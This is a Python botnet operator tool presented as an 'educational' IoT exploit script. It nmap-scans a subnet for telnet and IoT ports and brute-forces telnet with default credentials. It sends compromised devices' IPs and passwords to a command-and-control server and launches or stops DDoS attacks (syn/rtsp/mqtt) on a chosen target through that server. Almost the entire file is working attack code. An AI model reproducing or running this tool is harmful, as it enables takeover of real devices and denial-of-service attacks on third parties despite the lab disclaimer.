#!/usr/bin/env python3
"""
IoT Security Research - Exploit Script
Educational Purpose Only - For Controlled Lab Environment
"""

import socket
import telnetlib
import subprocess
import threading
import time
import requests
import json
import logging
import os
import platform
import sys
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('exploit.log'),
        logging.StreamHandler()
    ]
)

class IoTExploiter:
    def __init__(self, cnc_server_ip, subnet=None):
        self.cnc_server_ip = cnc_server_ip
        self.cnc_url = f"http://{cnc_server_ip}:5000"
        self.subnet = subnet or "11.10.10.0/24"
        
        # Common IoT device credentials - Based on your actual working credentials
        self.credentials = [
            ("admin", "admin"),           # This is working in your logs
            ("temphumidadmin", "admin"),  # This is working in your logs  
            ("ipcamadmin", "admin"),      # This is working in your logs
            ("root", "root"),
            ("admin", "password"),
            ("root", "password"),
            ("admin", ""),
            ("root", ""),
            ("admin", "1234"),
            ("root", "1234"),
            ("admin", "admin123"),
            ("root", "root123"),
            ("", ""),
        ]
        
        self.compromised_devices = []
        self.scan_results = []
        
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"[Exploiter] {message}")
        print(f"[{timestamp}] {message}")
    
    def scan_network(self):
        """Scan network for vulnerable IoT devices using direct nmap command"""
        try:
            self.log(f"Starting network scan on {self.subnet}")

            # Phase 1: Quick scan for active hosts
            self.log("Phase 1: Quick scan for active hosts...")
            result = subprocess.run([
                "nmap", "-sn", self.subnet
            ], capture_output=True, text=True, timeout=300)
            
            if result.returncode != 0:
                self.log(f"Nmap ping scan failed: {result.stderr}")
                return []
                
            output = result.stdout
            active_hosts = []
            for line in output.splitlines():
                if line.startswith("Nmap scan report for"):
                    # Extract IP from line like "Nmap scan report for 192.168.1.1"
                    parts = line.split()
                    if len(parts) >= 5:
                        ip = parts[-1].strip('()')
                        active_hosts.append(ip)
                        
            if not active_hosts:
                self.log("No active hosts found")
                return []
                
            self.log(f"Found {len(active_hosts)} active hosts")

            # Phase 2: Detailed scan of active hosts
            self.log("Phase 2: Detailed scan of active hosts...")
            target_ports = "23,80,443,1883,8883,8080"  # Common IoT ports
            vulnerable_hosts = []
            
            for host in active_hosts:
                try:
                    self.log(f"Scanning ports on {host}")
                    result = subprocess.run([
                        "nmap", "-p", target_ports, "-sV", "--open", host
                    ], capture_output=True, text=True, timeout=120)
                    
                    if result.returncode != 0:
                        self.log(f"Port scan failed for {host}: {result.stderr}")
                        continue
                        
                    output = result.stdout
                    current_ip = host
                    
                    for line in output.splitlines():
                        # Example: 23/tcp   open  telnet
                        if "/tcp" in line and "open" in line:
                            parts = line.split()
                            if len(parts) >= 3:
                                port_info = parts[0].split("/")[0]
                                try:
                                    port = int(port_info)
                                    service = parts[2] if len(parts) > 2 else "unknown"
                                    self.log(f"Found open port {port} ({service}) on {current_ip}")
                                    vulnerable_hosts.append({
                                        'ip': current_ip,
                                        'port': port,
                                        'service': service
                                    })
                                except ValueError:
                                    continue
                                    
                except subprocess.TimeoutExpired:
                    self.log(f"Timeout scanning {host}")
                    continue
                except Exception as e:
                    self.log(f"Error scanning {host}: {e}")
                    continue
            
            # Keep only unique results per IP (latest)
            latest_results = {}
            for device in vulnerable_hosts:
                ip = device['ip']
                latest_results[ip] = device
                
            self.scan_results = list(latest_results.values())
            self.log(f"Scan complete. Found {len(self.scan_results)} unique potentially vulnerable devices")
            
            # Send scan results to C&C server
            for device in self.scan_results:
                try:
                    response = requests.post(
                        f"{self.cnc_url}/add-scan-result",
                        json={
                            'ip': device['ip'],
                            'port': device['port'],
                            'service': device['service']
                        },
                        timeout=10
                    )
                    if response.status_code != 200:
                        self.log(f"Failed to send scan result for {device['ip']} to C&C server")
                except Exception as e:
                    self.log(f"Error sending scan result for {device['ip']}: {e}")

            return self.scan_results
            
        except subprocess.TimeoutExpired:
            self.log("Network scan timed out")
            return []
        except Exception as e:
            self.log(f"Error during network scan: {e}")
            return []
    
    def attempt_telnet_login(self, host, port, username, password):
        """Attempt telnet login with given credentials"""
        try:
            self.log(f"Attempting telnet login to {host}:{port} with {username}:{password}")
            tn = telnetlib.Telnet(host, port, timeout=10)
            
            # Wait for login prompt with multiple possible patterns
            login_patterns = [b"login: ", b"Login: ", b"Username: "]
            try:
                index, match, response = tn.expect(login_patterns, timeout=10)
                if not match:
                    self.log(f"No login prompt found for {host}")
                    tn.close()
                    return False
            except:
                self.log(f"Timeout waiting for login prompt on {host}")
                tn.close()
                return False
            
            # Send username
            tn.write(username.encode() + b"\n")
            
            # Wait for password prompt
            password_patterns = [b"Password: ", b"password: "]
            try:
                index, match, response = tn.expect(password_patterns, timeout=10)
                if not match:
                    self.log(f"No password prompt found for {host}")
                    tn.close()
                    return False
            except:
                self.log(f"Timeout waiting for password prompt on {host}")
                tn.close()
                return False
            
            # Send password
            tn.write((password or "").encode() + b"\n")
            
            # Check for successful login by looking for shell prompts
            shell_patterns = [b"$", b"#", b">", b"$ ", b"# ", b"> "]
            try:
                index, match, response = tn.expect(shell_patterns, timeout=10)
                success = match is not None
                
                if success:
                    self.log(f"✓ Login successful for {host} with {username}:{password}")
                else:
                    self.log(f"✗ Login failed for {host} with {username}:{password}")
                
                tn.close()
                return success
                
            except:
                self.log(f"Timeout waiting for shell prompt on {host}")
                tn.close()
                return False
            
        except Exception as e:
            self.log(f"Telnet login attempt failed for {host}: {e}")
            return False
    
    def register_compromised_device(self, ip, username, password):
        """Register compromised device with C&C server"""
        try:
            payload = {
                'ip': ip,
                'username': username,
                'password': password,
                'status': 'online'
            }
            
            self.log(f"Registering device {ip} with C&C server")
            response = requests.post(
                f"{self.cnc_url}/bot-checkin",
                json=payload,
                timeout=15
            )

            if response.status_code == 200:
                self.log(f"✓ Successfully registered compromised device {ip}")
                # Update local list
                device_info = {
                    'ip': ip,
                    'username': username,
                    'password': password,
                    'status': 'online'
                }
                # Remove any existing entry for this IP
                self.compromised_devices = [d for d in self.compromised_devices if d['ip'] != ip]
                # Add the new entry
                self.compromised_devices.append(device_info)
                return True
            else:
                self.log(f"✗ Failed to register device {ip}. Status: {response.status_code}")
                return False

        except Exception as e:
            self.log(f"✗ Error registering compromised device {ip}: {e}")
            return False
    
    def save_results(self):
        """Save scan and exploitation results"""
        try:
            # Create results directory if it doesn't exist
            os.makedirs('results', exist_ok=True)
            
            # Save scan results
            with open('results/scan_results.json', 'w') as f:
                json.dump(self.scan_results, f, indent=4)
            
            # Save compromised devices
            with open('results/compromised_devices.json', 'w') as f:
                json.dump(self.compromised_devices, f, indent=4)
            
            self.log("Results saved to results/ directory")
            
        except Exception as e:
            self.log(f"Error saving results: {e}")

    def start_ddos_via_c2(self):
        """Initiate Telnet-based DDoS attack via C2 server API"""
        if not self.compromised_devices:
            print("No compromised devices available. Please run brute-force first.")
            return

        print("\nStarting Telnet-based DDoS attack via C2 server...")
        target_ip = input("Enter target IP to attack: ").strip()
        
        if not target_ip:
            print("✗ Target IP cannot be empty.")
            return
            
        attack_type = input("Enter attack type (syn/rtsp/mqtt): ").lower().strip()

        if attack_type not in ['syn', 'rtsp', 'mqtt']:
            print("✗ Invalid attack type. Please choose syn, rtsp, or mqtt.")
            return

        try:
            print(f"Sending attack request to C2 server...")
            print(f"Target: {target_ip}, Attack Type: {attack_type}")
            
            response = requests.post(
                f"{self.cnc_url}/start-telnet-ddos",
                json={
                    "target": target_ip,
                    "attack_type": attack_type
                },
                timeout=60
            )
            
            print(f"Response Status Code: {response.status_code}")
            
            if response.status_code == 200:
                response_data = response.json()
                print(f"C2 server response: {response_data}")
                
                if response_data.get('status') == 'success':
                    successful_ips = response_data.get('successful_ips', [])
                    total_devices = len(self.compromised_devices)
                    
                    if successful_ips:
                        print(f"✓ Successfully started DDoS attack on {len(successful_ips)}/{total_devices} devices")
                        print(f"✓ Active attack devices: {', '.join(successful_ips)}")
                    else:
                        print(f"✗ Failed to start DDoS attack on any devices")
                        print(f"✗ All {total_devices} devices failed to execute the attack")
                        
                else:
                    error_msg = response_data.get('message', 'Unknown error')
                    print(f"✗ Attack failed: {error_msg}")
                    
            elif response.status_code == 400:
                error_data = response.json()
                print(f"✗ Bad request: {error_data.get('error', 'Unknown error')}")
                
            else:
                print(f"✗ C2 server returned error {response.status_code}")
                try:
                    error_data = response.json()
                    print(f"✗ Error details: {error_data}")
                except:
                    print(f"✗ Error response: {response.text}")

        except requests.exceptions.Timeout:
            print("✗ C2 server request timed out. The attack may still be starting...")
        except requests.exceptions.ConnectionError:
            print("✗ Cannot connect to C2 server. Check if the server is running.")
        except Exception as e:
            print(f"✗ Failed to initiate DDoS via C2: {e}")

    def stop_ddos_via_c2(self):
        """Stop Telnet-based DDoS attack via C2 server API"""
        print("\nStopping Telnet-based DDoS attack via C2 server...")
        
        try:
            response = requests.post(
                f"{self.cnc_url}/stop-telnet-ddos",
                timeout=60
            )
            
            if response.status_code == 200:
                response_data = response.json()
                print(f"✓ C2 server response: {response_data}")
                
                stopped_count = response_data.get('stopped_count', 0)
                print(f"✓ Successfully attempted to stop DDoS on {stopped_count} devices")
                
                errors = response_data.get('errors', {})
                if errors:
                    print(f"⚠ Errors stopping some devices: {list(errors.keys())}")
            else:
                print(f"✗ C2 server returned error {response.status_code}: {response.text}")

        except requests.exceptions.Timeout:
            print("✗ C2 server request timed out. The stop command may still be processing...")
        except Exception as e:
            print(f"✗ Failed to stop DDoS via C2: {e}")

    def brute_force_telnet(self):
        """Brute force telnet credentials for discovered devices"""
        if not self.scan_results:
            print("No scan results available. Please run a scan first.")
            return
            
        print("\nBrute-forcing Telnet credentials...")
        success_count = 0
        
        # Filter for telnet services
        telnet_targets = [target for target in self.scan_results 
                         if target['service'].lower() == 'telnet' and target['port'] == 23]
        
        if not telnet_targets:
            print("✗ No telnet services found in scan results.")
            return
            
        print(f"Found {len(telnet_targets)} telnet targets to brute force")
        
        for target in telnet_targets:
            target_ip = target['ip']
            self.log(f"Attempting brute-force on {target_ip}")
            
            success = False
            for username, password in self.credentials:
                if self.attempt_telnet_login(target_ip, 23, username, password):
                    self.log(f"✓ Success! {target_ip} - {username}:{password}")
                    if self.register_compromised_device(target_ip, username, password):
                        success_count += 1
                        success = True
                        break
                    else:
                        self.log(f"✗ Failed to register {target_ip} with C2 server")
                        break
                    
            if not success:
                self.log(f"✗ Brute-force failed for {target_ip} - tried all {len(self.credentials)} credential pairs")
    
        print(f"\nBrute-force completed!")
        if success_count > 0:
            print(f"✓ Successfully compromised {success_count}/{len(telnet_targets)} devices")
        else:
            print(f"✗ Failed to compromise any devices (0/{len(telnet_targets)})")
            print("✗ Check if credentials are correct or devices are accessible")
    
        self.print_status()

    def fetch_scan_results_from_c2(self):
        """Fetch scan results from the C2 server"""
        try:
            response = requests.get(f"{self.cnc_url}/get-scan-results", timeout=10)
            if response.status_code == 200:
                self.scan_results = response.json()
                self.log(f"Loaded {len(self.scan_results)} scan results from C2 server")
            else:
                self.log(f"Failed to fetch scan results from C2. Status: {response.status_code}")
        except requests.exceptions.Timeout:
            self.log("Timeout fetching scan results from C2")
        except Exception as e:
            self.log(f"Error fetching scan results: {e}")

    def fetch_compromised_devices_from_c2(self):
        """Fetch compromised devices from the C2 server"""
        try:
            response = requests.get(f"{self.cnc_url}/get-compromised-devices", timeout=10)
            if response.status_code == 200:
                self.compromised_devices = response.json()
                self.log(f"Loaded {len(self.compromised_devices)} compromised devices from C2")
            else:
                self.log(f"Failed to fetch compromised devices from C2. Status: {response.status_code}")
        except requests.exceptions.Timeout:
            self.log("Timeout fetching compromised devices from C2")
        except Exception as e:
            self.log(f"Error fetching compromised devices: {e}")

    def print_status(self):
        """Print current status"""
        print("\n" + "="*50)
        print("Current Status:")
        print("="*50)

        print("\n[Scan Results]")
        if not self.scan_results:
            print("No scan results available")
        else:
            for device in self.scan_results:
                print(f"IP: {device['ip']}, Port: {device['port']}, Service: {device['service']}")

        print("\n[Compromised Devices]")
        if not self.compromised_devices:
            print("No compromised devices available")
        else:
            sorted_devices = sorted(self.compromised_devices, key=lambda x: x['ip'])
            for device in sorted_devices:
                print(f"IP: {device['ip']}")
                print(f"Credentials: {device['username']}:{device['password']}")
                print(f"Status: {device.get('status', 'Unknown')}")
                print(f"Last Seen: {device.get('last_seen', 'N/A')}")
                print("-"*30)

        print("="*50)

    def interactive_menu(self):
        """Interactive menu for user control"""
        while True:
            # Fetch latest data from C2
            self.fetch_scan_results_from_c2()
            self.fetch_compromised_devices_from_c2()

            self.print_status()

            print("\nAvailable Actions:")
            print("1. Scan network for vulnerable devices")
            print("2. Brute-force Telnet credentials")
            print("3. Start Telnet DDoS attack (via C2)")
            print("4. Stop Telnet DDoS attack (via C2)")
            print("5. Save results to disk")
            print("6. Exit")

            choice = input("\nEnter your choice (1-6): ").strip()

            if choice == "1":
                print("\nScanning network...")
                self.scan_network()
                print("\nScan completed!")

            elif choice == "2":
                if not self.scan_results:
                    print("No scan results available. Please run a scan first.")
                else:
                    self.brute_force_telnet()

            elif choice == "3":
                self.start_ddos_via_c2()

            elif choice == "4":
                self.stop_ddos_via_c2()

            elif choice == "5":
                self.save_results()
                print("Results saved successfully!")

            elif choice == "6":
                print("Exiting...")
                break

            else:
                print("Invalid choice. Please try again.")

            input("\nPress Enter to continue...")

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='IoT Security Research - Exploit Script')
    parser.add_argument('--cnc', required=True, help='C&C server IP address')
    parser.add_argument('--subnet', help='Target subnet (default: 11.10.10.0/24)')
    args = parser.parse_args()

    # Test connectivity to C&C server
    cnc_ip = args.cnc
    print(f"Checking connectivity to C&C server at {cnc_ip}...")
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    
    try:
        result = subprocess.run(['ping', param, '1', cnc_ip], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               text=True, 
                               timeout=10)
        output = result.stdout.lower()
        
        if 'ttl=' in output or 'bytes from' in output:
            print(f"✓ C&C server {cnc_ip} is reachable")
        else:
            print(f"✗ Cannot reach C&C server at {cnc_ip}")
            exit(1)
            
    except Exception as e:
        print(f"✗ Error testing connectivity to C&C server: {e}")
        exit(1)

    exploiter = IoTExploiter(args.cnc, args.subnet)
    exploiter.interactive_menu()

if __name__ == "__main__":
    main()